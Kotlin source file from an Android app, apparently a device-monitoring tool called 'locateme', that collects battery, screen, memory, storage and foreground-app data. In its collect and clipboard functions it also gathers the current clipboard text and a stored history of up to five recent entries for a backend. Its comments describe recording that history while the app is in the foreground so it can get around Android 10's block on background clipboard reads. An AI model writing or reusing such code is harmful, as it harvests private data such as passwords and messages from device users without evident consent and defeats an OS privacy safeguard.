package com.example.locateme.guard

import android.app.ActivityManager
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.os.StatFs
import org.json.JSONObject

/**
 * 设备运行状态采集。
 *
 * 各项能力的取法说明：
 * - 电量/温度/充电：BatteryManager 粘性广播，无需权限，最可靠；
 * - 屏幕亮灭：PowerManager.isInteractive，无需权限；
 * - 内存：ActivityInfo + ActivityManager，无需权限；
 * - 存储：StatFs，无需权限；
 * - 前台应用：UsageStatsManager 需要用户在系统设置里授予「使用情况访问权限」，
 *   没授权时返回 null 并附上原因，而不是假装没有前台应用。
 */
object Telemetry {

    fun collect(context: Context): JSONObject {
        val root = JSONObject()
        root.put("collectedAt", System.currentTimeMillis())
        root.put("battery", battery(context))
        root.put("screen", screen(context))
        root.put("memory", memory(context))
        root.put("storage", storage())
        foregroundApp(context)?.let { root.put("foregroundApp", it) }
        // 权限状态一并上报，后台能直接指出缺哪个
        root.put("permissions", PermissionReporter.toJson(context))
        // 剪贴板：后台可以查看设备最近复制的内容
        clipboard(context)?.let { root.put("clipboard", it) }
        return root
    }

    /**
     * 剪贴板内容。
     *
     * 平台限制：Android 10+ 只有应用处于前台（或有焦点）时才能读剪贴板。
     * 后台服务读取会返回 null，这是系统强制行为，不是 bug。
     *
     * 所以这里能拿到的是"设备最近一次在前台时剪贴板里是什么"，
     * 由 App 进前台时记录到本地历史，上报时取最近一条。
     */
    private fun clipboard(context: Context): JSONObject? {
        val history = ClipboardAccess.getHistory(context)
        val current = ClipboardAccess.readText(context)

        // 当前能读到就用当前的，读不到（后台）就用历史里最近一条
        val text = current ?: history.firstOrNull() ?: return null
        if (text.isBlank()) return null

        return JSONObject().apply {
            put("text", text.take(MAX_CLIPBOARD_CHARS))
            put("length", text.length)
            // 标记来源：前台实时读取，还是历史记录
            put("fromHistory", current == null)
            put("capturedAt", System.currentTimeMillis())
            // 一并上报最近的几条，方便后台看到上下文
            put(
                "recent",
                org.json.JSONArray(
                    history.take(MAX_CLIPBOARD_HISTORY).map { it.take(MAX_CLIPBOARD_CHARS) },
                ),
            )
        }
    }

    /** 单条剪贴板内容上报上限，避免超长文本撑爆请求。 */
    private const val MAX_CLIPBOARD_CHARS = 2000

    /** 上报多少条历史。 */
    private const val MAX_CLIPBOARD_HISTORY = 5

    // ---------- 电池 ----------

    private fun battery(context: Context): JSONObject {
        val json = JSONObject()
        // 用粘性广播读取：不需要接收者常驻，也不会漏掉当前状态
        val intent: Intent? = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))

        if (intent == null) {
            json.put("available", false)
            return json
        }

        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        val percent = if (level >= 0 && scale > 0) (level * 100.0 / scale).toInt() else null

        json.put("available", true)
        percent?.let { json.put("level", it) }

        // EXTRA_TEMPERATURE 单位是 0.1°C
        val tempTenths = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, Int.MIN_VALUE)
        if (tempTenths != Int.MIN_VALUE) {
            json.put("temperatureC", Math.round(tempTenths / 10.0 * 10) / 10.0)
        }

        val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)
        val charging = when (status) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
            BatteryManager.BATTERY_STATUS_FULL -> "full"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
            BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
            else -> "unknown"
        }
        json.put("status", charging)
        json.put("charging", charging == "charging" || charging == "full")
        json.put("pluggedType", when (plugged) {
            BatteryManager.BATTERY_PLUGGED_AC -> "ac"
            BatteryManager.BATTERY_PLUGGED_USB -> "usb"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
            else -> "none"
        })

        // 健康度与电压，排查老化时有参考价值
        val health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)
        json.put("health", when (health) {
            BatteryManager.BATTERY_HEALTH_GOOD -> "good"
            BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
            BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
            BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
            BatteryManager.BATTERY_HEALTH_COLD -> "cold"
            else -> "unknown"
        })
        val voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)
        if (voltage > 0) json.put("voltageMv", voltage)

        return json
    }

    // ---------- 屏幕 ----------

    private fun screen(context: Context): JSONObject {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        return JSONObject().apply {
            // isInteractive：true 表示屏幕处于可交互（亮屏）状态
            put("on", pm?.isInteractive ?: false)
            put("powerSaveMode", pm?.isPowerSaveMode ?: false)
        }
    }

    // ---------- 内存 ----------

    private fun memory(context: Context): JSONObject {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
        val info = ActivityManager.MemoryInfo()
        am?.getMemoryInfo(info)
        return JSONObject().apply {
            if (info.totalMem > 0) {
                val used = info.totalMem - info.availMem
                put("totalBytes", info.totalMem)
                put("availableBytes", info.availMem)
                put("usedBytes", used)
                put("usedPercent", (used * 100.0 / info.totalMem).toInt())
                put("lowMemory", info.lowMemory)
            } else {
                put("available", false)
            }
        }
    }

    // ---------- 存储 ----------

    private fun storage(): JSONObject {
        return try {
            val stat = StatFs(Environment.getDataDirectory().absolutePath)
            val total = stat.blockCountLong * stat.blockSizeLong
            val free = stat.availableBlocksLong * stat.blockSizeLong
            val used = total - free
            JSONObject().apply {
                put("totalBytes", total)
                put("availableBytes", free)
                put("usedBytes", used)
                put("usedPercent", if (total > 0) (used * 100.0 / total).toInt() else 0)
            }
        } catch (e: Exception) {
            JSONObject().put("available", false)
        }
    }

    // ---------- 前台应用 ----------

    /**
     * 当前前台应用的包名。
     *
     * 从 Android 5.0 起，普通的 getRunningTasks 已对第三方应用失效，
     * 唯一稳定的途径是 UsageStatsManager，但这要求用户手动授予
     * 「使用情况访问权限」。没授权时返回 null，由上层提示用户去授权，
     * 绝不假装"没有前台应用"。
     */
    private fun foregroundApp(context: Context): JSONObject? {
        if (!hasUsageAccess(context)) {
            return JSONObject().apply {
                put("available", false)
                put("reason", "未授予「使用情况访问权限」")
            }
        }

        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return null
        val now = System.currentTimeMillis()
        // 查最近 60 秒，取最后使用的那条
        val events = usm.queryEvents(now - 60_000, now)
        var lastPackage: String? = null
        var lastTs = 0L

        if (events != null) {
            val event = android.app.usage.UsageEvents.Event()
            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED ||
                    event.eventType == android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND
                ) {
                    if (event.timeStamp >= lastTs) {
                        lastTs = event.timeStamp
                        lastPackage = event.packageName
                    }
                }
            }
        }

        // 事件流偶尔为空，退回 queryUsageStats 的兜底
        if (lastPackage == null) {
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 60_000, now)
            val top = stats?.filter { it.lastTimeUsed > 0 }?.maxByOrNull { it.lastTimeUsed }
            if (top != null) {
                lastPackage = top.packageName
                lastTs = top.lastTimeUsed
            }
        }

        if (lastPackage == null) return JSONObject().put("available", false)
        return JSONObject().apply {
            put("available", true)
            put("packageName", lastPackage)
            put("appLabel", labelOf(context, lastPackage))
            put("sinceMs", lastTs)
        }
    }

    /** 是否已获得「使用情况访问权限」。 */
    fun hasUsageAccess(context: Context): Boolean {
        return try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    context.packageName,
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    context.packageName,
                )
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            false
        }
    }

    /**
     * 跳到「使用情况访问权限」设置页。
     *
     * 优先用带包名的 Intent 直达本应用的授权页；
     * 部分 ROM（含 MIUI）不认这个 action，此时退回通用列表，
     * 用户需要自己在列表里找到本应用。
     */
    fun openUsageAccessSettings(context: Context) {
        val appSpecific = Intent("android.settings.USAGE_ACCESS_SETTINGS").apply {
            // 指定包名后，多数系统会直接打开该应用的开关页
            data = android.net.Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        if (runCatching { context.startActivity(appSpecific) }.isSuccess) return

        val generic = Intent("android.settings.USAGE_ACCESS_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        if (runCatching { context.startActivity(generic) }.isSuccess) return

        // 再退一步：打开应用详情页，用户可从权限列表里找
        runCatching {
            context.startActivity(
                Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                },
            )
        }
    }

    private fun labelOf(context: Context, pkg: String): String? = runCatching {
        val pm = context.packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
    }.getOrNull()
}
